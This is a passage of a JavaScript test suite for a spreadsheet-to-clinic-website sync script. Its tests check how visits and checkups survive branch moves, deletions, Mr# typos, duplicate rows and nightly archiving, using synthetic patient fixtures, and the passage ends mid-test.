  for (const v of [vA, vB]) v.updated_at = hourAgo;
  scripted(env);
  env.ctx.aajSetup();
  env.ticks(3);
  assert.ok(rowsSent(server).filter((x) => x.new).every((x) => x.edited_at === null), 'sent with no edit time');
  assert.equal(server.state.visits.length, 2, 'linked, nothing doubled');
  assert.equal(vA.status, 'completed', 'the sheet\'s Completed completes the visit (owner decision 1)');
  assert.equal(vA.treatment_label, 'Consultation', 'the website\'s treatment stays');
  assert.equal(vA.details, 'done', 'the website had no details: the sheet\'s are saved');
  assert.equal(cellOf(env, GUL, 2, 'waiting'), 'Completed', 'the sheet\'s Completed is not overwritten with Waiting');
  assert.equal(statusOf(env, GUL, 2), '⚠ Website change kept for: Treatment');
  assert.equal(vB.status, 'cancelled', 'the visit front desk cancelled stays Cancelled');
  assert.equal(cellOf(env, GUL, 3, 'waiting'), 'Cancelled');
});

// ------------------------------------------------------------------------------------------------ loop 8 of 11 Oct 2026: moves on the website, deleted rows at night, the Healthwire limit
const DHA = 'DHA KHI';
const GONE_CK = '✗ This checkup was deleted on the website. Delete this row.';

test('RS8-B1: a checkup front desk moves to another branch on the website is never deleted: the new branch\'s tab gets it, the old row reads "deleted on the website", and deleting that row removes nothing', () => {
  const { env, server } = world({ tabs: [GUL, DHA], rows: { [GUL]: CHECKUP_ROWS, [DHA]: [] }, patients: BASE_PATIENTS });
  settle(env, 3);
  const c = server.state.checkups.find((x) => x.name === 'Check One');
  assert.ok(c && c.sheet_key && c.branch === 'GUL', 'setup: the checkup was made from the Gulshan row');
  server.editCheckup(c.id, { branch: 'DHA' });                 // the Checkups page: Branch corrected to DHA
  env.advance(61000);
  env.ticks(3);
  assert.ok(server.state.checkups.includes(c), 'the checkup still exists');
  assert.ok(!server.state.removedLog.some((x) => x.snapshot.id === c.id), 'no removal pass took it for a deleted row');
  const rd = rowOf(env, DHA, 'Check One');
  assert.ok(rd, 'it is in the DHA tab now');
  assert.equal(statusOf(env, DHA, rd), '✓ Added from the website');
  assert.equal(c.sheet_key, cellOf(env, DHA, rd, 'sync key'), 'claimed by its DHA row');
  assert.equal(statusOf(env, GUL, 2), GONE_CK, 'the old Gulshan row says so');
  env.deleteRows(GUL, 2);                                      // staff do what the row says
  env.advance(61000);
  env.ticks(3);
  assert.ok(server.state.checkups.includes(c) && c.branch === 'DHA', 'deleting the old row removes nothing');
  setCell(env, DHA, rd, 'treatment details', 'moved here');
  env.advance(61000);
  env.ticks(2);
  assert.equal(c.details, 'moved here', 'the DHA row now keeps the checkup');
  assert.equal(server.state.checkups.length, 2, 'nothing was made twice');
});

test('RS8-B1: a website-made checkup (W- key) moved to another branch: its old row reads "moved to another branch or day", and an edit of that row never makes the checkup again in the old tab', () => {
  const { env, server } = world({ tabs: [GUL, DHA], rows: { [GUL]: CHECKUP_ROWS, [DHA]: [] }, patients: BASE_PATIENTS });
  settle(env, 3);
  const w = server.addCheckup({ branch: 'GUL', date: TODAY, name: 'Web Mover', phone: '03001110399', checkup_for: 'Checkup' });
  env.ticks(2);
  const r = rowOf(env, GUL, 'Web Mover');
  assert.ok(r && w.sheet_key === 'W-' + w.id, 'setup: added to the Gulshan tab and claimed there');
  server.editCheckup(w.id, { branch: 'DHA' });
  setCell(env, GUL, r, 'treatment details', 'typed after the move');
  env.advance(61000);
  env.ticks(3);
  assert.equal(statusOf(env, GUL, r), '✗ This checkup was moved to another branch or day on the website. Delete this row.');
  env.advance(61000);
  env.ticks(3);
  assert.equal(statusOf(env, GUL, r), '✗ This checkup was moved to another branch or day on the website. Delete this row.', 'and it keeps saying so');
  assert.equal(server.state.checkups.filter((x) => x.name === 'Web Mover').length, 1, 'never made a second time in Gulshan');
  assert.equal(w.details, '', 'the old row changed nothing');
  assert.ok(rowOf(env, DHA, 'Web Mover'), 'the DHA tab has it');
  assert.ok(!server.state.removedLog.some((x) => x.snapshot.id === w.id), 'nothing removed');
});

test('RSG-2 / RS8-B1: a visit front desk moves to another day reads "deleted on the website"; moved back to today it comes back as a website row (the old key went with the move), nothing doubles, and deleting the old row removes nothing', () => {
  const { env, server } = synced();
  const r = rowOf(env, GUL, 'Sample Person Three');
  const v = webVisit(server, 'Sample Person Three');
  server.editVisit(v.id, { date: '2026-10-10' });
  env.ticks(1);
  assert.equal(statusOf(env, GUL, r), GONE);
  assert.equal(v.sheet_key, null, 'the move let go of the sheet key');
  server.editVisit(v.id, { date: TODAY, details: 'back today' });
  env.ticks(1);
  const sh = env.tab(GUL), nc = colOf(env, GUL, 'patient');
  let r2 = null;
  for (let i = sh.used().rows; i >= 2 && !r2; i--) if (sh.text(i, nc) === 'Sample Person Three') r2 = i;
  assert.ok(r2 && r2 !== r, 'the visit is added again as a website row');
  assert.equal(statusOf(env, GUL, r2), '✓ Added from the website');
  assert.equal(cellOf(env, GUL, r2, 'treatment details'), 'back today');
  assert.equal(statusOf(env, GUL, r), GONE, 'the old row still says to delete it');
  env.deleteRows(GUL, r);
  env.advance(61000);
  env.ticks(3);
  assert.equal(visitsOfPatient(server, 'Sample Person Three').length, 1, 'one visit, never deleted');
  const r3 = rowOf(env, GUL, 'Sample Person Three');
  setCell(env, GUL, r3, 'waiting', 'Treatment');
  env.advance(61000);
  env.ticks(2);
  assert.equal(v.status, 'in_treatment', 'later edits of the new row reach the visit');
});

test('RS8-C1: at night a row whose visit front desk deleted on the website is not reported as "never reached the website": the log says it was deleted there, and its archive row is marked so Admin -> Import skips it', () => {
  const { env, server } = dayEnd();
  const r = rowOf(env, GUL, 'Sample Person Five');
  server.removeVisit(webVisit(server, 'Sample Person Five').id);
  env.ticks(1);
  assert.equal(statusOf(env, GUL, r), GONE);
  env.at(NEXT, '00:05');
  env.ticks(1);
  assert.equal(env.props.document.get('listDate:' + GUL), NEXT, 'the archive went ahead');
  const log = env.tab('Aaj Sync log').values().map((x) => x.join(' | ')).join('\n');
  assert.doesNotMatch(log, /Sample Person Five \| Archived without reaching the website/, 'never told to import it again');
  assert.doesNotMatch(log, /never reached the website/);
  assert.match(log, /Sample Person Five \| Deleted on the website \(or moved to another branch or day there\): archived under 2026-10-09 marked "deleted on the website"\. Admin > Import skips it\./);
  const arch = archiveSheet(env);
  const nameCol = arch.row(1).indexOf('Patients Name') + 1, idCol = arch.row(1).indexOf('Website visit id') + 1;
  let ar = 0;
  for (let i = 2; i <= arch.used().rows; i++) if (arch.text(i, nameCol) === 'Sample Person Five') ar = i;
  assert.ok(ar, 'the row is in the archive');
  assert.equal(arch.text(ar, idCol), 'deleted on the website');
  const t = web.readTab(arch.values());
  assert.ok(!t.rows.some((x) => x.name === 'Sample Person Five'), 'Admin -> Import reads past it');
  assert.equal(t.deletedOnWebsite, 1);
  assert.ok(t.rows.some((x) => x.name === 'Sample Person One'), 'the other rows are read as before');
});

test('RS8-C1: a checkup deleted on the website (its row left as "deleted") is not added to the nightly checkup list', () => {
  const w = ckWorld();
  const c = w.server.state.checkups.find((x) => x.name === 'Check One');
  w.server.removeCheckup(c.id);
  w.env.ticks(2);
  assert.equal(statusOf(w.env, GUL, 2), GONE_CK);
  w.env.at(TODAY, '23:58');
  w.env.ticks(1);
  w.env.at(NEXT, '00:05');
  w.env.ticks(1);
  const ck = ckSheet(w.env);
  const names = []; for (let i = 2; i <= ck.used().rows; i++) names.push(ck.text(i, 2));
  assert.deepEqual(names, ['Check Two'], 'only the checkup that is still on the website');
  const s = { cfg: { tab: GUL, branch: 'GUL' }, cols: w.env.call('aajDetectColumns', fixture.headers[GUL]) };
  assert.equal(w.env.call('aajCheckupLines', s, [{ key: 'S-0123456789ab', gone: true, cells: ['', 'Gone Lead', '', 'Checkup', '', '', '', '', '', '', '', '0300 1234567', ''] }], TODAY).length, 0, 'aajCheckupLines skips a row the website deleted');
  const arch = archiveSheet(w.env);
  const idCol = arch.row(1).indexOf('Website visit id') + 1;
  const ids = []; for (let i = 2; i <= arch.used().rows; i++) ids.push(arch.text(i, idCol));
  assert.ok(ids.includes('deleted on the website'), 'the deleted checkup is marked in the archive');
  assert.ok(ids.some((x) => /^checkup [0-9a-f-]{36}$/.test(x)), 'a checkup that is on the website is marked as a checkup (Admin -> Import skips it: never a visit)');
});

test('M-HW-SQUAT: a Healthwire Mr# above the highest one the website has plus 100 is refused as a probable typo; at the limit it is still a new patient', () => {
  const rows = [['9811', 'Sample Limit One', '', 'Scaling', '', 'Waiting', '', '', '', '', '', '03001110811', ''],
    ['9812', 'Sample Ahead One', '', 'Scaling', '', 'Waiting', '', '', '', '', '', '03001110812', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: [{ mr: '9711', name: 'Sample Healthwire Top', phone: '03001110711' }] });
  server.state.hwLimit = true;
  settle(env, 3);
  assert.ok(server.patientByMr('9811'), '9711 + 100 is made');
  assert.equal(server.patientByMr('9812'), undefined, '9711 + 101 is not');
  assert.equal(statusOf(env, GUL, 3), '✗ Mr# 9812 is not on the website and is higher than the newest Healthwire numbers it knows, so it looks like a typo. Check the Mr#. If it is right (a new Healthwire patient), ask Dr. Ali to import the latest Healthwire patients; this row is tried again every few minutes.');
  assert.equal(visitOfMr(server, '9812').length, 0);
});

// ------------------------------------------------------------------------------------------------ fix loop 3 (2026-10-11): RW8-1 (a slip in the Mr# cell), RW8-2 (a duplicate row's other row deleted)
const SLIP_PATIENTS = [{ mr: '9851', name: 'Slip Free Person', phone: '03001118851' }, { mr: '9852', name: 'Other Real Patient', phone: '03001118852' }];
const slipRow = () => ['9851', 'Slip Free Person', '', 'Scaling', '', 'Waiting', '', '', '', '', '', '03001118851', ''];

test('RW8-1: a stray keystroke in the Mr# cell of a linked visit row (token 7 typed there): the visit with front desk\'s notes stays, nothing is removed or made, the website\'s Mr# is written back', () => {
  const { env, server } = world({ rows: { [GUL]: [slipRow()] }, patients: SLIP_PATIENTS });
  settle(env, 3);
  const v = server.state.visits.find((x) => x.mr === '9851');
  assert.ok(v);
  const key = cellOf(env, GUL, 2, 'sync key');
  server.editVisit(v.id, { notes: 'front desk: xray done' });
  env.ticks(1);
  setCell(env, GUL, 2, 'mr', '7');
  settle(env, 3);
  assert.deepEqual(server.state.visits.map((x) => x.id), [v.id], 'the same visit, no other');
  assert.equal(v.notes, 'front desk: xray done');
  assert.equal(server.state.removedLog.length, 0, 'nothing was removed');
  assert.equal(server.patientByMr('7'), undefined, 'no patient file is made for the slip');
  assert.equal(cellOf(env, GUL, 2, 'mr'), '9851', "the website's Mr# is back in the cell");
  assert.equal(cellOf(env, GUL, 2, 'sync key'), key, 'the row keeps its key');
  assert.match(statusOf(env, GUL, 2), /^⚠ Mr# 7 is not this visit's patient, so Mr# 9851 is put back\. If this row is another patient, delete it and type that patient in a new row\.$/);
  // the next edit of the row goes through to the same visit
  setCell(env, GUL, 2, 'waiting', 'Treatment');
  settle(env, 2);
  assert.equal(v.status, 'in_treatment');
  assert.equal(statusOf(env, GUL, 2), '✓ On website');
});

test('RW8-1: a typo of 50000 or more, a Healthwire number far ahead, another patient\'s Mr# or a letter typed into the Mr# cell of a linked row never deletes the visit', () => {
  for (const typo of ['98510', '9951', '9852', '9851a']) {
    const { env, server } = world({ rows: { [GUL]: [slipRow()] }, patients: SLIP_PATIENTS });
    server.state.hwLimit = true;
    settle(env, 3);
    const v = server.state.visits.find((x) => x.mr === '9851');
    server.editVisit(v.id, { notes: 'front desk notes' });
    env.ticks(1);
    setCell(env, GUL, 2, 'mr', typo);
    settle(env, 3);
    assert.deepEqual(server.state.visits.map((x) => x.id), [v.id], typo + ': the visit stays, no other is made');
    assert.equal(v.notes, 'front desk notes', typo);
    assert.equal(server.state.removedLog.length, 0, typo + ': nothing removed');
    assert.equal(server.state.patients.length, 2, typo + ': no patient file made');
    assert.equal(cellOf(env, GUL, 2, 'mr'), '9851', typo + ': written back');
    assert.equal(server.state.visits.filter((x) => x.mr === '9852').length, 0, typo + ': the visit never moves to another patient');
  }
});

test('RW8-1: a stray keystroke in the Mr# cell of a checkup row: the checkup stays (never removed), no patient file is made; with the Mr# cleared the row ticks again', () => {
  const { env, server } = ckWorld();
  const c = server.state.checkups.find((x) => x.name === 'Check One');
  const key = c.sheet_key;
  const nPatients = server.state.patients.length;
  setCell(env, GUL, 2, 'mr', '7');
  settle(env, 3);
  assert.equal(server.checkupById(c.id), c, 'the checkup stays');
  assert.equal(c.sheet_key, key);
  assert.equal(server.state.removedLog.length, 0, 'nothing removed');
  assert.equal(server.state.visits.length, 0, 'no visit');
  assert.equal(server.state.patients.length, nPatients, 'no patient file (owner rule 6)');
  assert.equal(cellOf(env, GUL, 2, 'sync key'), key, 'the row keeps the checkup\'s key');
  assert.equal(statusOf(env, GUL, 2), '✗ Needs attention: Mr# 7 is not a patient on the website with this name, so this row stays a checkup. Clear the Mr# if this is a checkup patient (no Mr#), or check the number.');
  setCell(env, GUL, 2, 'mr', '');
  settle(env, 2);
  assert.equal(statusOf(env, GUL, 2), '✓ On website', 'the refusal goes once the Mr# is cleared');
  assert.equal(server.checkupById(c.id), c);
  assert.equal(server.state.visits.length, 0);
});

test('RW8-1: another Mr# typed on a registered checkup row (same name): the checkup keeps its patient and the registered Mr# is written back', () => {
  const { env, server } = ckWorld();
  const c = server.state.checkups.find((x) => x.name === 'Check One');
  server.addPatient({ mr: '50020', name: 'Check One', phone: '03001110301' });
  server.editCheckup(c.id, { patient_mr: '50020' });
  settle(env, 2);
  assert.equal(cellOf(env, GUL, 2, 'mr'), '50020');
  setCell(env, GUL, 2, 'mr', '50021');
  settle(env, 3);
  assert.equal(c.patient_mr, '50020');
  assert.equal(server.checkupById(c.id), c, 'the checkup stays');
  assert.equal(server.state.visits.length, 0);
  assert.equal(cellOf(env, GUL, 2, 'mr'), '50020', 'the registered Mr# is back');
  assert.match(statusOf(env, GUL, 2), /^⚠ Mr# 50021 is not this checkup's patient, so Mr# 50020 is put back\./);
});

test('RW8-2: the same patient added on the website and typed in the sheet; staff delete the row added from the website: the typed row takes over that visit at once, front desk\'s notes stay, nothing is removed', () => {
  const { env, server } = world({ rows: { [GUL]: [slipRow()] }, patients: [...SLIP_PATIENTS, { mr: '9853', name: 'Twice Entered', phone: '03001118853' }] });
  settle(env, 3);
  const wv = server.addVisit({ branch: 'GUL', date: TODAY, mr: '9853', treatment: 'Braces consultation' });
  wv.notes = 'came with mother';
  env.ticks(2);
  const wr = rowOf(env, GUL, 'Twice Entered');
  assert.ok(wr, 'added from the website');
  env.typeRow(GUL, wr + 1, ['9853', 'Twice Entered', '', 'Consultation', '', 'Waiting', '', '', '', '', '', '03001118853', '']);
  settle(env, 2);
  assert.match(statusOf(env, GUL, wr + 1), new RegExp('^✗ Already on this list in row ' + wr + ' \\(Mr# 9853\\)'));
  env.deleteRows(GUL, wr);                      // staff delete the row the website added (not the one they typed)
  env.ticks(1);                                 // one minute later
  assert.equal(server.visitById(wv.id), wv, 'the website visit was never removed');
  assert.equal(server.state.removedLog.length, 0);
  assert.equal(wv.notes, 'came with mother');
  assert.equal(wv.sheet_key, cellOf(env, GUL, wr, 'sync key'), 'the typed row holds the visit now');
  env.ticks(2);
  assert.equal(statusOf(env, GUL, wr), '✓ On website');
  assert.equal(server.state.visits.filter((x) => x.mr === '9853').length, 1);
});

test('RW8-2: the same Mr# typed in two rows; staff delete the first (linked) row and keep the second: the second takes over the visit at once, the website notes stay', () => {
  const rows = [slipRow(), ['9853', 'Twice Entered', '', 'RCT', '', 'Waiting', '', '', '', '', '', '03001118853', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: [...SLIP_PATIENTS, { mr: '9853', name: 'Twice Entered', phone: '03001118853' }] });
  settle(env, 3);
  const v = server.state.visits.find((x) => x.mr === '9853');
  v.notes = 'xray taken';
  env.typeRow(GUL, 4, ['9853', 'Twice Entered', '', 'RCT second sitting', '', 'Waiting', '', '', '', '', '', '03001118853', '']);
  settle(env, 2);
  assert.match(statusOf(env, GUL, 4), /^✗ Already on this list in row 3/);
  env.deleteRows(GUL, 3);
  env.ticks(1);
  assert.equal(server.visitById(v.id), v, 'the visit was never removed');
  assert.equal(server.state.removedLog.length, 0);
  assert.equal(v.notes, 'xray taken');
  assert.equal(v.sheet_key, cellOf(env, GUL, 3, 'sync key'));
  env.ticks(2);
  assert.equal(statusOf(env, GUL, 3), '✓ On website');
});

test('RW8-3: two weeks after the last Healthwire import, a new Healthwire patient typed in the sheet is still taken (the limit moves 10 a day); a slip far ahead is still refused, and the answer never tells front desk to add the patient on the website', () => {
  const DAY = 86400000;
  const rows = [['9967', 'Brand New Patient', '', 'Consultation', '', 'Waiting', '', '', '', '', '', '03001119967', ''],
    ['10300', 'Far Ahead Slip', '', 'Consultation', '', 'Waiting', '', '', '', '', '', '03001110300', '']];
  const { env, server } = world({ rows: { [GUL]: rows } });
  server.state.hwLimit = true;
  // Healthwire registered its patient 9866 two weeks ago (the last import); the sync has since made 9867-9966 from typed rows
  server.addPatient({ mr: '9866', name: 'Hw Last Imported', phone: '03001110000', created: env.clock.ms - 14 * DAY });
  for (let n = 9867; n <= 9966; n++) server.addPatient({ mr: String(n), name: 'Synced Person ' + n, phone: '0300' + (2000000 + n) }).sync_made = '2026-10-01';
  settle(env, 3);
  assert.ok(server.patientByMr('9967'), '9866 + 100 + 14 days x 10 = 10106: Healthwire\'s new patient 9967 is made');
  assert.equal(visitOfMr(server, '9967').length, 1);
  assert.equal(server.patientByMr('10300'), undefined, 'a number far above the limit (10300 > 10106) is still refused');
  assert.equal(statusOf(env, GUL, 3), '✗ Mr# 10300 is not on the website and is higher than the newest Healthwire numbers it knows, so it looks like a typo. Check the Mr#. If it is right (a new Healthwire patient), ask Dr. Ali to import the latest Healthwire patients; this row is tried again every few minutes.');
  assert.doesNotMatch(statusOf(env, GUL, 3), /on the website first/, 'front desk cannot give a Healthwire number (a new patient there gets 50000+)');
});

test('RW8-1: a checkup row that still shows a refused stray Mr# at midnight is still a checkup: it is on the nightly checkup list, never a patient file', () => {
  const { env, server } = ckWorld();
  setCell(env, GUL, 2, 'mr', '7');
  settle(env, 3);
  assert.match(statusOf(env, GUL, 2), /^✗ Needs attention: Mr# 7 is not a patient on the website with this name/);
  quiet(env, server);
  env.at(TODAY, '23:58'); env.ticks(1);
  env.at(NEXT, '00:05'); env.ticks(1);
  assert.deepEqual(ckSheet(env).values().slice(1).map((r) => r[1]).sort(), ['Check One', 'Check Two'], 'both checkup patients are leads');
  assert.equal(server.patientByMr('7'), undefined);
  assert.equal(server.state.checkups.length, 2, 'both checkups stay on the website');
});

test('RW8-1: a stray keystroke on a row whose new Healthwire patient file the sheet made today (token 7, a digit too many) is written back too; only the correction of a slip (two digits or fewer away) lets the row go', () => {
  const rows = [['9790', 'New Hw Person', '', 'Consultation', '', 'Waiting', '', '', '', '', '', '03001119790', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: BASE_PATIENTS });
  settle(env, 3);
  assert.ok(server.patientByMr('9790'), 'setup: the sheet made the file');
  const v = server.state.visits.find((x) => x.mr === '9790');
  for (const typo of ['7', '97901']) {
    setCell(env, GUL, 2, 'mr', typo);
    settle(env, 3);
    assert.deepEqual(server.state.visits.map((x) => x.id), [v.id], typo + ': the same visit');
    assert.ok(server.patientByMr('9790'), typo + ': the file stays');
    assert.equal(server.patientByMr(typo), undefined, typo + ': no file for the slip');
    assert.equal(cellOf(env, GUL, 2, 'mr'), '9790', typo + ': written back');
    assert.equal(server.state.removedLog.length, 0, typo + ': nothing removed');
  }
});

// ------------------------------------------------------------------------------------------------ fix loop 2 (2026-10-11, second round): RV9-1 (a copy left at midnight), RV9-2 (let-go records in Treatment / Completed)
const NEXT2 = '2026-10-11';
const RV9_PATIENTS = [...BASE_PATIENTS, { mr: '9712', name: 'Bravo Brace', phone: '03001110712' }];
const rv9Rows = () => [
  ['9701', 'Sample Person One', '', 'Scaling', '', 'Completed', '', '', 'polish done', '', '', '03001110001', ''],
  ['9712', 'Bravo Brace', '6', 'Braces', '', 'Completed', '', '', 'wire', '', '', '03001110712', ''],
  ['', 'Ck Echo Nine', '', 'Checkup', '', 'Completed', '', '', 'pain', '', '', '03009990905', ''],
  ['9703', 'Sample Person Six', '', 'Filling', '', 'Waiting', '', '', '', '', '', '03001110006', ''],
];
/** midnight and the next morning: the archive runs, then three ticks at 08:01 of the next day */
function rv9Night(env) {
  env.at(TODAY, '23:58'); env.ticks(1);
  env.at(NEXT, '00:05'); env.ticks(2);
}
function rv9Morning(env) {
  env.at(NEXT, '08:01'); env.ticks(3);
}
const archDates = (env) => { const a = archiveSheet(env); return a ? a.values().slice(1).map((r) => r[0]) : []; };

test('RV9-1: a whole row copied (hidden key too) and left on the tab until midnight: the archive clears both rows once, and the next morning makes nothing from yesterday', () => {
  for (const variant of ['braces visit', 'checkup', 'copy with another treatment']) {
    const { env, server } = world({ rows: { [GUL]: rv9Rows() }, patients: RV9_PATIENTS });
    settle(env, 3);
    assert.equal(server.state.visits.length, 3, variant + ': setup');
    assert.equal(server.state.checkups.length, 1, variant + ': setup');
    const sh = env.tab(GUL);
    const src = variant === 'checkup' ? 4 : 3;
    const dst = sh.used().rows + 1;
    saveRows(sh, src, 1)[0].forEach((cell, j) => { if (cell) sh._set(dst, j + 1, cell); });      // the whole row, hidden cells too
    if (variant === 'copy with another treatment') sh._set(dst, colOf(env, GUL, 'treatment'), { kind: 's', v: 'Polish' });
    env.touch();
    settle(env, 3);
    assert.equal(statusOf(env, GUL, dst), `✗ Duplicate of row ${src}: delete this row.`, variant);
    rv9Night(env);
    assert.equal(env.props.document.get('listDate:' + GUL), NEXT, variant + ': a new list began');
    assert.deepEqual(dataCells(env), [], variant + ': the tab is empty: the original and its copy are both cleared (sheet-behaviour RV9-1: before, the original stayed)');
    assert.equal(archDates(env).length, 5, variant + ': four rows and the copy, each archived once (never "edited while archived" and copied again)');
    assert.ok(!logText(env).includes('edited while they were being archived'), variant);
    rv9Morning(env);
    assert.deepEqual(server.visitsOf('GUL', NEXT), [], variant + ': no visit on the next day from yesterday\'s row');
    assert.deepEqual(server.checkupsOf('GUL', NEXT), [], variant + ': no checkup on the next day');
    assert.deepEqual(ckSheet(env).values().slice(1).map((r) => r[1]), ['Ck Echo Nine'], variant + ': the checkup patient is on the nightly list once');
  }
});

test('RV9-1: the guide\'s path at midnight: four rows deleted at once (held), put back by the sync, then Ctrl+Z: the four "Duplicate of row N" rows nobody deleted are cleared with the rest, and the next morning makes nothing', () => {
  const ph = (i) => '0302900000' + i;
  const rows = [
    ['9861', 'Rv Alpha', '', 'Scaling', '', 'Waiting', '', '', '', '', '', ph(1), ''],
    ['9862', 'Rv Bravo', '6', 'Braces', '', 'Completed', '', '', '', '', '', ph(2), ''],
    ['', 'Ck Echo', '', 'Checkup', '', 'Completed', '', '', '', '', '', ph(5), ''],
    ['', 'Ck Foxtrot', '', 'Checkup', '', 'Waiting', '', '', '', '', '', ph(6), ''],
    ['9863', 'Rv Charlie', '', 'Scaling', '', 'Waiting', '', '', '', '', '', ph(3), ''],
    ['9864', 'Rv Delta', '', 'Scaling', '', 'Waiting', '', '', '', '', '', ph(4), ''],
  ];
  const patients = [1, 2, 3, 4].map((i) => ({ mr: String(9860 + i), name: 'Rv ' + ['Alpha', 'Bravo', 'Charlie', 'Delta'][i - 1], phone: ph(i) }));
  const { env, server } = world({ rows: { [GUL]: rows }, patients });
  settle(env, 3);
  const sh = env.tab(GUL);
  const saved = saveRows(sh, 3, 4);
  env.deleteRows(GUL, 3, 4);
  env.ticks(2);
  undoDelete(env, GUL, 3, saved);
  env.advance(61000);
  env.ticks(3);
  for (const name of ['Rv Bravo', 'Ck Echo', 'Ck Foxtrot', 'Rv Charlie']) assert.equal(rowsNamed(env, GUL, name).length, 2, name + ' twice (setup)');
  rv9Night(env);
  assert.deepEqual(dataCells(env), [], 'the tab is empty');
  assert.equal(env.props.document.get('listDate:' + GUL), NEXT);
  rv9Morning(env);
  assert.deepEqual(server.visitsOf('GUL', NEXT), [], 'no visit on the next day (before: Rv Bravo Completed with Month 6, Rv Charlie Waiting)');
  assert.deepEqual(server.checkupsOf('GUL', NEXT), [], 'no checkup on the next day (before: Ck Echo and Ck Foxtrot)');
  assert.deepEqual(ckSheet(env).values().slice(1).map((r) => r[1]).sort(), ['Ck Echo', 'Ck Foxtrot'], 'each checkup patient once on the nightly list');
});

test('RV9-1 (safety net): a row of an earlier day that nobody edited since is never sent as a new row: it says "Left over", and the next archive clears it without copying it again', () => {
  const { env, server } = world({ rows: { [GUL]: rv9Rows() }, patients: RV9_PATIENTS });
  settle(env, 3);
  const sh = env.tab(GUL);
  const bravo = saveRows(sh, 3, 1);
  const echo = saveRows(sh, 4, 1);
  rv9Night(env);
  assert.deepEqual(dataCells(env), []);
  // yesterday's rows are back on the tab with their hidden cells (as if a clear had missed them)
  [...bravo, ...echo].forEach((row, i) => row.forEach((cell, j) => { if (cell) sh._set(2 + i, j + 1, cell); }));
  env.touch();
  const from = server.calls.length;
  rv9Morning(env);
  assert.deepEqual(server.visitsOf('GUL', NEXT), [], 'no visit made from yesterday\'s row');
  assert.deepEqual(server.checkupsOf('GUL', NEXT), [], 'no checkup made from yesterday\'s row');
  assert.equal(sentRowsSince(server, from).length, 0, 'nothing sent for them');
  assert.equal(statusOf(env, GUL, 2), `✗ Left over from ${TODAY} (archived that night): delete this row.`);
  assert.equal(statusOf(env, GUL, 3), `✗ Left over from ${TODAY} (archived that night): delete this row.`);
  assert.equal(server.visitsOf('GUL', TODAY).filter((v) => v.status === 'completed').length, 2, 'yesterday\'s visits are not touched');
  // a row typed over today is today's row, as before
  setCell(env, GUL, 3, 'patient', 'Morning Walk In');
  setCell(env, GUL, 3, 'contact', '03001110777');
  env.advance(61000);
  env.ticks(3);
  assert.deepEqual(server.checkupsOf('GUL', NEXT).map((c) => c.name), ['Morning Walk In'], 'the row typed over this morning is a checkup of the new day');
  const before = archDates(env).length;
  env.at(NEXT, '23:58'); env.ticks(1);
  env.at(NEXT2, '00:05'); env.ticks(2);
  assert.deepEqual(dataCells(env), [], 'the next archive clears the left-over row too');
  assert.deepEqual(archDates(env).slice(before), [NEXT], 'only the new day\'s row is archived under the new date; the left-over row was archived on its own day');
  assert.match(logText(env), /1 rows left over from an earlier day are cleared/);
  assert.deepEqual(ckSheet(env).values().slice(1).map((r) => r[1]), ['Ck Echo Nine', 'Morning Walk In'], 'yesterday\'s checkup patient is not listed a second time');
});

test('RV9-2: an Mr# looked up in Healthwire typed into a Completed or Treatment checkup row: the patient\'s visit is made, the checkup goes, its row does not come back and the patient is no lead at night', () => {
  for (const status of ['Completed', 'Treatment']) {
    const rows = [['', 'Sana Recall', '', 'Checkup', '', status, '', 'Dr Haniya', 'scaling advised', '', '', '03001119710', ''],
      ['', 'Check Two Nine', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001119711', '']];
    const { env, server } = world({ rows: { [GUL]: rows }, patients: [...BASE_PATIENTS, { mr: '9710', name: 'Sana Recall', phone: '03001119710' }] });
    settle(env, 3);
    const c = server.state.checkups.find((x) => x.name === 'Sana Recall');
    assert.equal(c.day_status, status === 'Completed' ? 'completed' : 'in_treatment', status + ': setup');
    setCell(env, GUL, 2, 'mr', '9710');
    env.advance(61000);
    env.ticks(4);
    const v = server.state.visits.find((x) => x.mr === '9710');
    assert.ok(v, status + ': the patient\'s visit');
    assert.equal(v.status, status === 'Completed' ? 'completed' : 'in_treatment', status);
    assert.equal(server.checkupById(c.id), undefined, status + ': the checkup went (sheet-behaviour RV9-2: before, it stayed and its row came back)');
    assert.equal(rowsNamed(env, GUL, 'Sana Recall').length, 1, status + ': no row came back');
    assert.equal(cellOf(env, GUL, 2, 'sync key'), v.sheet_key, status);
    assert.match(logText(env), /the checkup is removed from the website and this person is not on the checkup list/);
    env.at(TODAY, '23:58'); env.ticks(1);
    env.at(NEXT, '00:05'); env.ticks(1);
    assert.deepEqual(ckSheet(env).values().slice(1).map((r) => r[1]), ['Check Two Nine'], status + ': only the real checkup patient is a lead');
  }
});

test('RV9-2: a Month typed into a Completed or Treatment checkup row: the row needs the Mr#, the checkup goes and is no lead at night; with the Mr# it is the patient\'s visit', () => {
  for (const status of ['Completed', 'Treatment']) {
    const P = '03001116011';
    const rows = [['', 'Brace Forgot Nine', '', 'Checkup', '', status, '', '', '', '', '', P, '']];
    const { env, server } = world({ rows: { [GUL]: rows }, patients: [...BASE_PATIENTS, { mr: '9761', name: 'Brace Forgot Nine', phone: P }] });
    settle(env, 3);
    const c = server.state.checkups.find((x) => x.name === 'Brace Forgot Nine');
    setCell(env, GUL, 2, 'months', '6');
    setCell(env, GUL, 2, 'treatment', 'Wire change');
    env.advance(61000);
    env.ticks(4);
    assert.match(statusOf(env, GUL, 2), /^✗ Needs attention: add the Mr#/, status);
    assert.equal(server.checkupById(c.id), undefined, status + ': the checkup went (a braces patient is no checkup)');
    assert.equal(rowsNamed(env, GUL, 'Brace Forgot Nine').length, 1, status + ': no row came back');
    assert.equal(c.checkup_for, 'Checkup', status + ': nothing of the row was put on the checkup');
    setCell(env, GUL, 2, 'mr', '9761');
    env.advance(61000);
    env.ticks(3);
    const v = server.state.visits.find((x) => x.mr === '9761');
    assert.ok(v, status + ': with the Mr# the row is the patient\'s visit');
    assert.deepEqual([v.braces_month, v.treatment_label], [6, 'Wire change'], status);
    env.at(TODAY, '23:58'); env.ticks(1);
    env.at(NEXT, '00:05'); env.ticks(1);
    const ck = ckSheet(env);
    assert.ok(!ck || !ck.values().some((r) => r.includes('Brace Forgot Nine')), status + ': not on the nightly checkup list');
  }
});

test('RV9-2: a Healthwire Mr# typed with a slip on a Completed or Treatment row, then corrected: one visit, on the right file; the file made from the slip goes and no "Not removed" row comes back', () => {
  for (const status of ['Completed', 'Treatment']) {
